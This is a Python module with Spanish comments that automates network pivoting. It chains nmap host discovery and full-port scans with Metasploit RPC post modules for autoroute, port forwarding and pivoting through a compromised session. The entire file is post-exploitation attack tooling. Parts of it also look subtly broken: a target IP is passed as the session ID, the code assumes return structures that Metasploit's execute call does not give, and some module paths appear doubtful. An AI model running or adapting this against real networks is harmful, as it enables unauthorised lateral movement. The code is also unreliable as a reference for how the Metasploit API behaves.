#!/usr/bin/env python3

import logging
import subprocess
import os
import time
import json
import nmap
from typing import Dict, List
from pymetasploit3.msfrpc import MsfRpcClient

logger = logging.getLogger(__name__)

class NetworkPivoting:
    def __init__(self, msf_client: MsfRpcClient, config: Dict):
        """Inicializa el módulo de pivoting de red"""
        self.msf_client = msf_client
        self.config = config
        self.temp_dir = os.path.join(os.path.dirname(__file__), "..", "..", "temp")
        os.makedirs(self.temp_dir, exist_ok=True)
        self.nm = nmap.PortScanner()
    
    def perform_pivoting(self, target: str, credentials: Dict = None) -> Dict:
        """Realiza pivoting automático en la red"""
        result = {
            "discovered_networks": [],
            "accessible_hosts": [],
            "routes": [],
            "tunnels": []
        }
        
        try:
            # Descubrir redes
            networks = self._discover_networks(target)
            result["discovered_networks"] = networks
            
            # Encontrar hosts accesibles
            for network in networks:
                hosts = self._find_accessible_hosts(network)
                result["accessible_hosts"].extend(hosts)
            
            # Establecer rutas
            routes = self._establish_routes(target, result["accessible_hosts"])
            result["routes"] = routes
            
            # Crear túneles
            tunnels = self._create_tunnels(target, routes)
            result["tunnels"] = tunnels
            
            # Realizar pivoting
            pivot_results = self._perform_pivot(target, tunnels)
            result["pivot_results"] = pivot_results
        
        except Exception as e:
            logger.error(f"Error en pivoting de red: {str(e)}")
        
        return result
    
    def _discover_networks(self, target: str) -> List[Dict]:
        """Descubre redes accesibles"""
        networks = []
        
        try:
            # Escanear redes
            self.nm.scan(target, arguments='-sn')
            
            for host in self.nm.all_hosts():
                network = {
                    "ip": host,
                    "mac": self.nm[host].get('addresses', {}).get('mac', ''),
                    "hostname": self.nm[host].get('hostnames', [{}])[0].get('name', ''),
                    "status": self.nm[host].get('status', {}).get('state', '')
                }
                networks.append(network)
        
        except Exception as e:
            logger.error(f"Error al descubrir redes: {str(e)}")
        
        return networks
    
    def _find_accessible_hosts(self, network: Dict) -> List[Dict]:
        """Encuentra hosts accesibles en la red"""
        hosts = []
        
        try:
            # Escanear hosts en la red
            self.nm.scan(network["ip"], arguments='-sS -sV -p- --min-rate=1000')
            
            for host in self.nm.all_hosts():
                if self.nm[host].get('status', {}).get('state') == 'up':
                    host_info = {
                        "ip": host,
                        "mac": self.nm[host].get('addresses', {}).get('mac', ''),
                        "hostname": self.nm[host].get('hostnames', [{}])[0].get('name', ''),
                        "os": self.nm[host].get('osmatch', [{}])[0].get('name', ''),
                        "services": []
                    }
                    
                    # Obtener servicios
                    for proto in self.nm[host].all_protocols():
                        for port in self.nm[host][proto].keys():
                            service = self.nm[host][proto][port]
                            if service.get('state') == 'open':
                                host_info["services"].append({
                                    "port": port,
                                    "name": service.get('name', ''),
                                    "version": service.get('version', '')
                                })
                    
                    hosts.append(host_info)
        
        except Exception as e:
            logger.error(f"Error al encontrar hosts accesibles: {str(e)}")
        
        return hosts
    
    def _establish_routes(self, target: str, hosts: List[Dict]) -> List[Dict]:
        """Establece rutas de pivoting"""
        routes = []
        
        try:
            if not self.msf_client:
                return routes
            
            # Usar módulos de Metasploit para establecer rutas
            modules = [
                "post/multi/manage/autoroute",
                "post/windows/manage/autoroute"
            ]
            
            for module in modules:
                try:
                    # Configurar módulo
                    route_module = self.msf_client.modules.use('post', module)
                    route_module['SESSION'] = target
                    
                    # Ejecutar módulo
                    result = route_module.execute()
                    
                    if result and "routes" in result:
                        routes.extend(result["routes"])
                
                except Exception as e:
                    logger.error(f"Error al ejecutar módulo {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error al establecer rutas: {str(e)}")
        
        return routes
    
    def _create_tunnels(self, target: str, routes: List[Dict]) -> List[Dict]:
        """Crea túneles para pivoting"""
        tunnels = []
        
        try:
            if not self.msf_client:
                return tunnels
            
            # Usar módulos de Metasploit para crear túneles
            modules = [
                "post/multi/manage/portfwd",
                "post/windows/manage/portfwd"
            ]
            
            for module in modules:
                try:
                    # Configurar módulo
                    tunnel_module = self.msf_client.modules.use('post', module)
                    tunnel_module['SESSION'] = target
                    
                    # Ejecutar módulo
                    result = tunnel_module.execute()
                    
                    if result and "tunnels" in result:
                        tunnels.extend(result["tunnels"])
                
                except Exception as e:
                    logger.error(f"Error al ejecutar módulo {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error al crear túneles: {str(e)}")
        
        return tunnels
    
    def _perform_pivot(self, target: str, tunnels: List[Dict]) -> Dict:
        """Realiza pivoting a través de los túneles"""
        pivot_results = {
            "successful_pivots": [],
            "failed_pivots": [],
            "discovered_resources": []
        }
        
        try:
            if not self.msf_client:
                return pivot_results
            
            # Usar módulos de Metasploit para pivoting
            modules = [
                "post/multi/manage/pivot",
                "post/windows/manage/pivot"
            ]
            
            for module in modules:
                try:
                    # Configurar módulo
                    pivot_module = self.msf_client.modules.use('post', module)
                    pivot_module['SESSION'] = target
                    
                    # Ejecutar módulo
                    result = pivot_module.execute()
                    
                    if result:
                        if result.get("success"):
                            pivot_results["successful_pivots"].extend(result.get("pivots", []))
                        else:
                            pivot_results["failed_pivots"].extend(result.get("failed", []))
                        
                        if "resources" in result:
                            pivot_results["discovered_resources"].extend(result["resources"])
                
                except Exception as e:
                    logger.error(f"Error al ejecutar módulo {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error al realizar pivoting: {str(e)}")
        
        return pivot_results 